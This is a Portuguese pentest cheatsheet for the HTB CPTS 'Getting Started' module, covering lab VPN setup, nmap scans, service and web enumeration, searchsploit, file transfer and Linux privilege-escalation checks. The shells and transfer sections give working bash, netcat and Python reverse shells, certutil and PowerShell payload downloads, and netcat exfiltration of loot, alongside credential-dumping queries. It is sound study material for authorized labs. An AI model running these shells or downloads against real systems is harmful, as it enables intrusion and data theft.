---
tema: Pentest / Fundamentos
tópico: Getting Started — primeiros passos em um alvo
tags: [htb, cpts, fundamentos, vpn, nmap, ftp, smb, ssh, rdp, mysql, web-enum, searchsploit, shells]
dificuldade: fundamental
---

# CPTS 02 - Getting Started — Cheatsheet

> [!info] Escopo deste cartão
> Módulo de entrada: conectar no lab, escanear, interagir com os serviços mais comuns, enumerar web, achar exploit público, obter shell e escalar privilégio local.
> Serve como **primeiro passe** em qualquer máquina desconhecida. Para profundidade, use os cartões 03, 04, 11, 25 e 26.

---

## 🎯 Quando usar

| Situação | Seção |
|----------|-------|
| Acabei de receber um alvo e não sei nada dele | Scan + Enumeração de serviços |
| Porta 80/443 aberta | Enumeração web |
| Preciso de exploit pronto para uma versão conhecida | Public Exploits |
| Já tenho execução de comando e quero shell interativa | Shells |
| Preciso subir ferramenta no alvo e não tenho senha | Transferência de arquivos |
| Tenho shell como usuário comum | Privilege Escalation |

---

## 🧰 Ferramentas

| Ferramenta | Função | Nota |
|------------|--------|------|
| `openvpn` | Conectar na VPN do lab | Necessário para alcançar o alvo |
| `nmap` | Scan de portas e serviços | Base de tudo |
| `ftp` | Cliente FTP | Dados, scripts, backups |
| `smbclient` / `smbmap` | Acesso SMB | Shares e credenciais |
| `ssh` / `scp` | Acesso remoto e cópia | Chave ou senha |
| `xfreerdp` | Cliente RDP | GUI Windows |
| `mysql` | Cliente MySQL | DB exposto |
| `whatweb` | Fingerprint web | Tecnologias e versões |
| `gobuster` / `ffuf` | Brute force de diretórios/arquivos | Conteúdo oculto |
| `searchsploit` | Exploit-DB local | Exploit público |
| `nc` / `ncat` | Listener e pivô simples | Shell reversa |
| `python3 -m http.server` | Servidor HTTP rápido | Transferir arquivos |
| `GTFOBins` / `linpeas.sh` | Privesc Linux local | Enumeração de vetores |

---

## 🔌 Conexão com o laboratório

```bash
# Baixe o arquivo .ovpn no painel da plataforma e conecte.
# O que faz: cria a interface tun0 e roteia o tráfego até a rede do lab.
sudo openvpn user.ovpn

# Confirma que a interface subiu e pegou IP.
ip a show tun0

# Testa alcance no alvo (ICMP pode estar bloqueado; ausência de resposta não é ausência de host).
ping -c 2 <IP>
```

> 💡 Se `tun0` não aparece, a VPN não conectou — nenhum scan vai funcionar. Verifique antes de culpar o alvo.

---

## 🔎 Scan inicial

```bash
# Portas TCP comuns + detecção de serviço + scripts default.
# O que faz: identifica o que está aberto e a versão de cada serviço.
nmap -sV -sC <IP>

# Scan completo de portas, rápido, sem resolução DNS.
# Quando usar: sempre. Serviço em porta alta é comum em labs.
nmap -p- --min-rate 1000 -T4 -Pn -n <IP>

# Scan UDP dos portas mais prováveis.
# Quando usar: DNS(53), SNMP(161), NTP(123), TFTP(69) podem passar só em UDP.
sudo nmap -sU --top-ports 100 <IP>

# Salva tudo nos três formatos para reuso e relatório.
nmap -sV -sC -p- -oA nmap_full <IP>
```

---

## 🗂️ Enumeração de serviços

### FTP (21)

```bash
# Tenta login anônimo.
# O que faz: muitos servidores de lab permitem user anonymous sem senha.
ftp <IP>
# Dentro do cliente:
#   Name: anonymous
#   Password: <enter>
ls                     # lista arquivos
binary                 # modo binário antes de baixar executáveis
passive                # se atrás de NAT/firewall
get arquivo.txt        # baixa um arquivo
put local.txt          # envia arquivo
bye                    # sai

# Espelha todo o FTP anônimo de uma vez.
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# Verifica versão e se permite anônimo sem abrir sessão.
nmap -sV -p21 --script ftp-anon,ftp-syst <IP>
```

### SMB (139/445)

```bash
# Lista shares sem credencial (null session).
smbclient -L //<IP>/ -N

# Conecta em um share específico.
smbclient //<IP>/share -N                 # anônimo
smbclient //<IP>/share -U <USUARIO>       # autenticado

# Mapeia shares, permissões e discos acessíveis.
smbmap -H <IP>
smbmap -H <IP> -u <USUARIO> -p '<SENHA>'

# Enumera hosts/shares/usuários de forma rápida em lote.
nxc smb <IP> -u <USUARIO> -p '<SENHA>' --shares
nxc smb <IP> -u <USUARIO> -p '<SENHA>' --users
nxc smb <IP> -u <USUARIO> -p '<SENHA>' --shares --users   # sucessor do crackmapexec
```

> [!tip] O que procurar em SMB
> `IPC$`, `print$`, `SYSVOL`, `NETLOGON`, pasta de usuário, backups, `.config`, scripts de login, `web.config`. Tudo isso costuma conter credencial em texto claro.

### SSH (22)

```bash
# Login com senha ou chave.
ssh <USUARIO>@<IP>
ssh -i id_rsa <USUARIO>@<IP>              # chave privada (chmod 600 antes)
ssh -o StrictHostKeyChecking=no <USUARIO>@<IP>   # lab, aceita host key nova

# Gera par de chaves quando preciso semear authorized_keys.
ssh-keygen -t ed25519 -f ./id_ed25519

# Copia arquivos via SSH.
scp arquivo.txt <USUARIO>@<IP>:/tmp/
scp <USUARIO>@<IP>:/etc/passwd ./loot/
```

### RDP (3389)

```bash
# Cliente RDP em Linux (GUI via X).
xfreerdp /v:<IP> /u:<USUARIO> /p:'<SENHA>' /cert:ignore /dynamic-resolution

# Alternativa leve.
rdesktop -u <USUARIO> -p '<SENHA>' <IP>

# Checa se RDP está exposto e a versão/segurança.
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <IP>
```

### MySQL (3306)

```bash
# Conecta no banco remoto.
mysql -u root -h <IP> -p
mysql -u <USUARIO> -h <IP> -p'<SENHA>'

# Dentro do cliente:
SHOW databases;                       -- lista os bancos
USE <db>;                             -- seleciona
SHOW tables;                          -- lista tabelas
DESCRIBE users;                       -- colunas da tabela
SELECT user, password FROM users;     -- dump de credenciais
SELECT LOAD_FILE('/etc/passwd');      -- leitura de arquivo se tiver FILE priv
```

---

## 🌐 Enumeração web

```bash
# Fingerprint: servidor, CMS, versões, headers.
whatweb -v http://<IP>

# Headers crus, útéis para versão de servidor e tecnologias.
curl -I http://<IP>
curl -s http://<IP> | head -100

# Brute force de diretórios e arquivos.
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50

# Variante com extensões de código — encontra páginas dinâmicas.
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,bak

# Busca recursiva: acha diretórios dentro de diretórios.
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ -recursion -recursion-depth 2

# Filtra por status: só o que existe de verdade.
ffuf -w wordlist.txt -u http://<IP>/FUZZ -fc 404

# Fuzzing de parâmetros GET.
ffuf -w params.txt -u "http://<IP>/page.php?FUZZ=test" -fs 0
```

**Onde olhar no resultado:** `robots.txt`, `sitemap.xml`, `.git/`, `backup.zip`, `index.php.bak`, painéis de admin, endpoints de API, comentários HTML com credencial.

---

## 💥 Exploits públicos

```bash
# Busca local no Exploit-DB (não precisa internet).
# O que faz: cruza termo/versão com exploits conhecidos.
searchsploit apache 2.4.49
searchsploit --exclude="dos" openssh 7.2

# Copia o exploit para o diretório atual para editar.
searchsploit -m 50383

# Mostra o caminho local do exploit (dentro do Exploit-DB instalado).
searchsploit -p 50383

# Cópia completa do Exploit-DB, caso queira grep manual.
# (nesta máquina: /usr/share/exploitdb)
```

> [!warning] Exploit público não é plug-and-play
> Leia o código antes de rodar. Ajuste LHOST/LPORT, alvo e payload. Exploit de DOS **não** serve para obter acesso. Versionamento diferente pode quebrar.

---

## 🐚 Shells

```bash
# 1) Listener no atacante. -l escuta, -v verboso, -n não resolve DNS, -p porta.
nc -lvnp 1234

# 2) No alvo — shell reversa bash (Linux).
bash -i >& /dev/tcp/<IP>/1234 0>&1

# 3) No alvo — netcat com execução (quando o nc do alvo suporta -e).
nc <IP> 1234 -e /bin/bash

# 4) Reverse shell interativa com Python (estabiliza o terminal).
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",1234));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'

# 5) Shell bind: escuta no alvo e você conecta nele.
nc -lvnp 4444 -e /bin/bash          # no alvo
nc <IP> 4444                        # no atacante
```

**Upgrade do terminal (Linux):**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # depois Ctrl+Z
stty raw -echo; fg                                # retoma com TTY cru
export TERM=xterm; stty rows 50 cols 200          # ajusta janela
```

---

## 📦 Transferência de arquivos

```bash
# Servidor HTTP no atacante, na pasta dos arquivos.
python3 -m http.server 8000

# Alvo baixa (Linux).
wget http://<IP>:8000/linpeas.sh -O /tmp/linpeas.sh
curl -O http://<IP>:8000/linpeas.sh
chmod +x /tmp/linpeas.sh

# Alvo baixa (Windows) sem navegador.
certutil -urlcache -split -f http://<IP>:8000/shell.exe C:\Windows\Temp\shell.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>:8000/shell.exe','C:\Windows\Temp\shell.exe')"

# Envio pelo canal netcat (sem HTTP).
nc -lvnp 9001 > loot.txt              # recebe no atacante
nc <IP> 9001 < loot.txt               # envia do alvo

# Upload direto via SSH.
scp ferramenta <USUARIO>@<IP>:/tmp/
```

---

## ⬆️ Privilege Escalation — primeiro passe Linux

```bash
# Quem sou eu e o que posso rodar como root.
id
sudo -l                       # binários permitidos via sudo → GTFOBins

# Versão do kernel: candidatos a kernel exploit.
uname -a
cat /etc/os-release

# Arquivos com SUID — executados como dono (root).
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Capabilities: binários com privilégio granular.
getcap -r / 2>/dev/null

# Cron jobs: script editável agendado = execução como o dono do job.
cat /etc/crontab
ls -la /etc/cron.*

# Credenciais esquecidas em arquivos de config e histórico.
grep -ri "password\|passwd\|secret" /var/www /home 2>/dev/null
cat ~/.bash_history

# Enumeração automatizada (trasfere e rode).
./linpeas.sh | tee /tmp/linpeas.out
```

> 💡 Consulta obrigatória: **GTFOBins** para cada binário que `sudo -l` ou SUID retornar. Se o binário está lá, geralmente há uma linha para virar root.

---

## ⚠️ Pegadinhas

| 🕳️ | Detalhe |
|-----|---------|
| Julgar host por ICMP | Firewall bloqueia ping. Use `-Pn` e confie na porta aberta. |
| Só escanear o top 1000 | Serviço pode estar em 8080, 8443, 5985, 10000. Faça `-p-`. |
| Ignorar UDP | DNS/SNMP/TFTP não aparecem em scan TCP. |
| `nmap -sC` como verdade final | Script default não cobre tudo; enumere o serviço manualmente. |
| Bash reverso sem aspas | `>& /dev/tcp/...` precisa de `bash -i` e shell que suporte `/dev/tcp`. |
| Shell que morre ao dar Ctrl+C | Estabilize com `pty.spawn` + `stty raw -echo`. |
| Baixar exploit sem ler | Pode ser DOS, precisa de ajuste ou de dependência faltante. |
| Chave SSH com permissão aberta | `chmod 600 id_rsa`, senão o cliente recusa. |
| RDP sem X11 | `xfreerdp` precisa de display; use `-x` via WSL/X forwarding. |
| `searchsploit` desatualizado | Rode `searchsploit -u` para sincronizar a base. |

---

## ✅ Checklist rápido

- [ ] VPN ativa (`tun0` com IP) e alvo alcançável
- [ ] Scan rápido + scan completo de portas salvos com `-oA`
- [ ] Serviços anotados com versão e banner
- [ ] Acesso anônimo testado em FTP/SMB (e null session)
- [ ] Enumeração web com `whatweb` + `gobuster`/`ffuf` (diretórios e extensões)
- [ ] `robots.txt`, `sitemap.xml` e backup files verificados
- [ ] Exploit público localizado e **lido** antes de executar
- [ ] Listener pronto antes de disparar a shell
- [ ] Shell estabilizada em TTY
- [ ] Transferência de ferramentas funcionando (HTTP/SCP/nc)
- [ ] `sudo -l`, SUID, capabilities e cron revisados
- [ ] Evidência de cada passo registrada para o relatório

---

## 🔗 Relacionado

- [[CPTS 03 - Network Enumeration with Nmap]]
- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 08 - Shells and Payloads]]
- [[CPTS 25 - Linux Privilege Escalation]]
- [[Fase 03 - Reconhecimento de Rede]]
